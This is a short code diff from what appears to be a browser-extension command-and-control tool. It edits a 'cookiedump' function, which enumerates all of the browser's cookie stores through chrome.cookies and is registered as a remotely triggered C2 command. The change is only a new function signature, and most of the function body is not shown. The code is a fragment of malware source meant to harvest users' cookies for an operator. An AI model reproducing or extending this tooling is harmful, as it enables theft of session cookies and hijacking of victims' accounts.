@@ -1,4 +1,4 @@
-cookiedump = function() {
+cookiedump = function(params) {
     let results = [];
     chrome.cookies.getAllCookieStores(function(stores) {
         stores.forEach(function (store) {
@@ -18,3 +18,4 @@ cookiedump = function() {
 };
 
 C2.commands[cookiedump.name] = cookiedump;
+
